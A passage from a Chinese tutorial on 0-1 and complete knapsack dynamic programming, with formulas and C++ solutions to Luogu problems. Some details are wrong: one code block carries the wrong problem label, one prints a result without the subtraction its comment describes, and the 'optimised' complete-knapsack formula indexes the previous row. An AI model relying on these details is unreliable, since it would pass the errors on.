id="二维dp解法">二维DP解法</h3><p>使用二维<code>dp[][]</code>数组,其中dp[j]表示体积为j的背包能装下的最大体积.</p><p>状态转移方程:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo><mo>+</mo><mi>w</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp[i][j]=max(dp[i-1][j],dp[i-1][j-weight[i]]+weight[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 洛谷P1049 装箱问题</span></span><br><span class="line"><span class="comment">// 注意观察,与常规01背包的区别仅仅是将v[]直接用w[]替换,并用m减去最终结果即可,其他完全相同</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXM 1000</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">w</span><span class="params">(n + <span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; dp(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = w[<span class="number">0</span>];i &lt;= m;++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = w[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 两个for循环的顺序颠倒也可以</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>;i &lt; n;++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j &lt;= m;++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; w[i])</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = max(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - w[i]] + w[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; dp[n - <span class="number">1</span>][m];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一维dp优化">一维DP优化</h3><p>使用一维dp[]数组,其中dp[j]表示体积为j的背包能装下的最大体积.</p><p>对于每一个物品i,仍然考虑选或不选,则有2种情况:</p><ol><li>不选物品i,f[j]不变</li><li>选物品i,f[j]=f[j-w[i]]+w[i]</li></ol><p>则有状态转移方程:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo><mo>+</mo><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[j]=max(f[j],f[j-w[i]]+w[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><p>其实同样,只是将v[i]替换为w[i],然后输出结果为(背包总大小W-f[W])即可.</p><p>C++代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 洛谷P1048 采药</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXM 1000</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">w</span><span class="params">(n + <span class="number">1</span>)</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">dp</span><span class="params">(m + <span class="number">1</span>, <span class="number">0</span>)</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 两个for循环的顺序不可以颠倒!</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m;j &gt;= w[i];--j) &#123;</span><br><span class="line">            dp[j] = max(dp[j], dp[j - w[i]] + w[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m-dp[m];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="完全背包">完全背包</h1><h2 id="题目描述">题目描述:</h2><p>有N件物品和一个最多能背重量为W的背包。第i件物品的重量是weight[i]，得到的价值是value[i]。每件物品都有无限个（也就是可以放入背包多次），求解将哪些物品装入背包中物品价值的总和最大。</p><h2 id="问题分析">问题分析:</h2><p>借鉴01背包,使用<code>f[i][j]</code>来代表状态(见前)</p><h3 id="朴素做法">朴素做法</h3><p>对第i件物品,枚举其选了多少次(个)来转移,时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>.状态转移方程如下:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><munderover><mo><mi>m</mi><mi>a</mi><mi>x</mi></mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mrow><mo>+</mo><mi mathvariant="normal">∞</mi></mrow></munderover><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>k</mi><mo>×</mo><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo><mo>+</mo><mi>k</mi><mo>×</mo><mi>v</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[i][j] = \mathop{max}\limits_{k=0}^{+\infty}(f[i-1][j-k\times w[i]]+k\times v[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.890999em;vertical-align:-0.752108em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.138891em;"><span style="top:-2.347892em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord mathdefault">ma</span><span class="mord mathdefault">x</span></span></span></span><span style="top:-3.63056em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.752108em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><p>可以考虑如此优化:</p><p>由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f[i][j-w[i]]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span></span></span></span>已经由<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>2</mn><mo>×</mo><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f[i-1][j-2\times w[i]]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span></span></span></span>更新过,也就是说<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f[i][j-w[i]]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span></span></span></span>已经是充分考虑了第i件物品所选次数后的结果,因此,可以将状态转移方程优化为:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo><mo>+</mo><mi>v</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[i][j] = max(f[i-1][j],f[i-1][j-w[i]]+v[i])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><h3 id="一维优化">一维优化</h3><p>同样,可以将二维优化为一维.</p><p>但与01背包不同,该问题中每个物品都有无限多个,因此首先遍历顺序就要改变.</p><pre><code>在01背包的一维优化的代码中,内层循环(背包大小)必须从大到小遍历,以保证每个物品只被添加一次;而在完全背包中,该物品是可以被添加多次的,因此要从小到大遍历.</code></pre><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = w[i];j &lt;= m;++j) &#123;</span><br><span class="line">        dp[j] = max(dp[j], dp[j - w[i]] + v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外,在完全背包的一维DP中,两层循环的顺序其实并不影响结果(但是诸如&quot;装满背包的方式有几种&quot;这样的问题就有区别了).</p><p>C++代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 洛谷 P1616 疯狂的采药</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> f[<span class="number">10000001</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> w, v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w &gt;&gt; v; <span class="comment">// 由于物品的遍历在外,所以边读边做</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=w;j&lt;=m;++j)&#123;</span><br><span class="line">            f[j]=max(f[j],f[j-w]+v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; f[m];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 